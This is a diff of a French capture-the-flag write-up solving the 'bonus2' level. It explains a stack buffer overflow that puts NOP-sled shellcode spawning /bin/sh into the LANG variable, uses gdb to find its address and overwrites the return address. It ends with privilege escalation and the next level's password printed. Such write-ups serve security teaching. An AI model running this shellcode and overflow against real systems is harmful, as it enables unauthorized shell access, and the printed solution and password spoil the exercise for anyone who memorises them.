@@ -150,6 +150,41 @@
 	   0x08048528 <+164>:	ret    
 	End of assembler dump.
 
-export LANG="$(python -c 'print("nl" + "\x90" * 100 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80")')"
+on set l'env LANG avec au début une langue prise en charge par le programme. puis on envoie 100 octets de l'instruction NOP
+Cela permettra de ne pas à avoir à retomber pile sur le début du shellcode.
+Le shellcode permet comme dans les exercices précédant de faire un appel à /bin/sh via execve
 
-./bonus2 $(python -c 'print "A"*40') $(python -c 'print "B"*23 + "\xbc\xfe\xff\xbf"')
+> export LANG="$(python -c 'print("nl" + "\x90" * 100 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80")')"
+
+On a l'adresse de retour à ebp+4 et notre padding qui commence à ebp-0x48, on doit donc avoir un padding de 0x4c de long soit 76 octets
+On a d'abords 40 octets comme 1er arg, ainsi il n'y a pas de caractère NULL à la fin car strncpy prends 40 octets au total.
+Puis on ajoute 23 octets dans le 2eme arg et avec les 13 octets du bonjour en Néerlandais ("Goedemiddag! ") on a 76 octets.
+Enfin on cherche l'adresse où se trouve l'env afin de changer l'adresse de retour pour rediriger vers un des NOP dans $LANG
+
+> gdb bonus2 
+> run test test
+> b *main
+> set $lang = (char *) getenv("LANG")
+> x/100bx $lang
+0xbffffeb1:	0x6e	0x6c	0x90	0x90	0x90	0x90	0x90	0x90
+0xbffffeb9:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
+0xbffffec1:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
+0xbffffec9:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
+0xbffffed1:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
+0xbffffed9:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
+0xbffffee1:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
+0xbffffee9:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
+0xbffffef1:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
+0xbffffef9:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
+0xbfffff01:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
+0xbfffff09:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
+0xbfffff11:	0x90	0x90	0x90	0x90
+
+puis on prend une adresse environ au milieu et on l'ajoute en little-endian dans le 2eme arg
+
+> ./bonus2 $(python -c 'print "A"*40') $(python -c 'print "B"*23 + "\xbc\xfe\xff\xbf"')
+Goedemiddag! AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBB����
+> id
+uid=2012(bonus2) gid=2012(bonus2) euid=2013(bonus3) egid=100(users) groups=2013(bonus3),100(users),2012(bonus2)
+> cat /home/user/bonus3/.pass
+71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
